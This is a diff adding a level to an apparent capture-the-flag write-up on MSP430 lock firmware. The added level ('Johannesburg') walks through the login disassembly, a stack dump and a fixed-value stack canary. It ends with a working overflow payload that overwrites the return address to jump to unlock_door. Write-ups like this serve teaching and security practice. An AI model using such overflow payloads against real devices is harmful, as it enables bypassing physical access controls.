@@ -303,3 +303,50 @@ call #0x2464
 ```
 
 Looking at the user manual one can see that this interrupt is used to interface with the deadbolt and trigger an unlock. In order to reach this line the value at memory location `@r4-0x24` needs to be `f2ad`. Using the debugger, this memory location turns out to be the start of the entered password. Therefore, the password is: `0xf2ad`.
+
+Level 6: Johannesburg
+---------------------
+
+As with previous levels, we begin our journey with the `login` subroutine:
+
+```
+452c <login>
+452c:  3150 eeff      add   #0xffee, sp
+4530:  f140 a600 1100 mov.b #0xa6, 0x11(sp)
+4536:  3f40 7c44      mov   #0x447c "Enter the password to continue.", r15
+453a:  b012 f845      call  #0x45f8 <puts>
+453e:  3f40 9c44      mov   #0x449c "Remember: passwords are between 8 and 16 characters.", r15
+4542:  b012 f845      call  #0x45f8 <puts>
+4546:  3e40 3f00      mov   #0x3f, r14
+454a:  3f40 0024      mov   #0x2400, r15
+454e:  b012 e845      call  #0x45e8 <getsn>
+4552:  3e40 0024      mov   #0x2400, r14
+4556:  0f41           mov   sp, r15
+4558:  b012 2446      call  #0x4624 <strcpy>
+455c:  0f41           mov   sp, r15
+455e:  b012 5244      call  #0x4452 <test_password_valid>
+4562:  0f93           tst   r15
+4564:  0524           jz    #0x4570 <login+0x44>
+4566:  b012 4644      call  #0x4446 <unlock_door>
+456a:  3f40 d144      mov   #0x44d1 "Access granted.", r15
+456e:  023c           jmp   #0x4574 <login+0x48>
+4570:  3f40 e144      mov   #0x44e1 "That password is not correct.", r15
+4574:  b012 f845      call  #0x45f8 <puts>
+4578:  f190 a600 1100 cmp.b #0xa6, 0x11(sp)
+457e:  0624           jeq   #0x458c <login+0x60>
+4580:  3f40 ff44      mov   #0x44ff "Invalid Password Length: password too long.", r15
+4584:  b012 f845      call  #0x45f8 <puts>
+4588:  3040 3c44      br    #0x443c <__stop_progExec__>
+458c:  3150 1200      add   #0x12, sp
+4590:  3041           ret
+```
+
+This is very similar to Cusco, the difference being that the developers "improved the security of the lock by ensuring passwords that are too long will be rejected". This is implemented in `0x4578`, where the value saved in the stack 18 bytes after our password starts is verified to be `0xa6`, therefore allowing us to enter no more than 17 chars. The concept is similar to [stack canaries](http://en.wikipedia.org/wiki/Stack_buffer_overflow#Stack_canaries), the difference being that true stack canaries are random and thus can not be so easily exploited. The stack with entered password `idosch1234`:
+
+```
+43d0:   0000 0000 0000 0000 0000 a845 0100 a845   ...........E...E
+43e0:   0300 1c46 0000 0a00 0000 7845 6964 6f73   ...F......xEidos
+43f0:   6368 3132 3334 0000 0000 0000 00a6 3c44   ch1234........<D
+```
+
+Visible are the password, the stack canary at `0x43fd` and the saved PC (`0x443c`). Since the program reads up to `0x3f` bytes from the user it very easy to bypass this protection. We simply enter 17 bytes, then the canary (`0xa6`) and then whichever address we want to make the program return to (to `unlock_door` obviously). The password: `0x4141414141414141414141414141414141a64644` is a good choice.
